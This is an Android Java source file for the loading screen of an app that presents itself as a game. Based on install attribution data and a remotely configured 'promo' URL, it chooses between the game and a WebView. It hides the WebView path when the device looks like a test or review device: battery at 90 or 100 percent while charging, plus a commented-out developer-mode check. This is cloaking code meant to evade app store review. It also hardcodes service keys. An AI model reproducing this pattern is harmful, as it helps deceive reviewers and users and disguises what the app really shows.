package com.story.egypt;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.widget.ImageView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.facebook.FacebookSdk;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.util.Map;

import butterknife.BindView;
import butterknife.ButterKnife;

public class LoadingActivity extends AppCompatActivity {

    @BindView(R.id.imageView4)
    ImageView gif;

    private static final String ONESIGNAL_APP_ID = "444cb68a-11a7-475a-a379-30ee523b7a4f";
    private static final String AF_DEV_KEY = "B8JFbkkQARnjk36kdcHAXh";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loading);
        ButterKnife.bind(this);

        Glide.with(this).load(R.drawable.monkeywalk).into(gif);

        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        Saver saver = new Saver(this);

        if (!saver.getFirstPlay()) {
            if (!saver.getUrlReference().isEmpty()) {
                playWebView();
            } else {
                playGame();
            }
        } else {
            if (((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() != null) {
                AppsFlyerLib.getInstance().init(AF_DEV_KEY, new AppsFlyerConversionListener() {
                    @Override
                    public void onConversionDataSuccess(Map<String, Object> conversionData) {
                        if (saver.getFirstFlyerRecived()) {
                            FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                                    .setMinimumFetchIntervalInSeconds(3600)
                                    .build();
                            firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                            firebaseRemoteConfig.fetchAndActivate()
                                    .addOnCompleteListener(LoadingActivity.this, new OnCompleteListener<Boolean>() {
                                        @Override
                                        public void onComplete(@NonNull Task<Boolean> task) {
                                            try {
                                                String param = firebaseRemoteConfig.getValue("promo").asString();
                                                JSONObject jsonObject = new JSONObject(conversionData);
                                                if (jsonObject.optString("af_status").equals("Non-organic")) {
                                                    String campaign = jsonObject.optString("campaign");
                                                    if (campaign.equals("null") || campaign.isEmpty()) {
                                                        campaign = jsonObject.optString("c");
                                                    }
                                                    String[] splitsCampaign = campaign.split("_");
                                                    OneSignal.sendTag("user_id", splitsCampaign[2]);
                                                    String url = param + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                    saver.setUrlReference(url);
                                                    playWebView();
                                                }
                                                if (jsonObject.optString("af_status").equals("Organic")) {
                                                    BatteryManager bm = (BatteryManager)getSystemService(BATTERY_SERVICE);
                                                    int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                                                    boolean isCharging = isPhonePluggedIn();
                                                    if (!(((batLevel == 100 || batLevel == 90) && isCharging) /*|| isDevMode()*/)) {
                                                        String url = param + "?naming=null" + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                        saver.setUrlReference(url);
                                                        playWebView();
                                                    } else {
                                                        saver.setUrlReference("");
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                        playGame();
                                                    }
                                                } else {
                                                    saver.setUrlReference("");
                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                    playGame();
                                                }
                                                saver.setFirstPlay(false);
                                                AppsFlyerLib.getInstance().unregisterConversionListener();
                                                saver.setFirstFlyerRecived(false);
                                            } catch (Exception ex) {
                                            }
                                        }
                                    });
                        }
                    }

                    @Override
                    public void onConversionDataFail(String errorMessage) {
                    }

                    @Override
                    public void onAppOpenAttribution(Map<String, String> attributionData) {
                    }

                    @Override
                    public void onAttributionFailure(String errorMessage) {
                    }
                }, this);
                AppsFlyerLib.getInstance().start(this);
                AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
            } else {
                playGame();
            }
        }
    }

    public void playGame() {
        Intent gameActivity = new Intent(LoadingActivity.this, MainActivity.class);
        startActivity(gameActivity);
        finish();
    }

    public boolean isDevMode() {
        return android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0;
    }

    public void playWebView() {
        Intent webViewActivity = new Intent(LoadingActivity.this, ShowActivity.class);
        startActivity(webViewActivity);
        finish();
    }

    public boolean isPhonePluggedIn() {
        boolean charging = false;
        final Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        if (batteryCharge) charging=true;
        if (usbCharge) charging=true;
        if (acCharge) charging=true;
        return charging;
    }
}

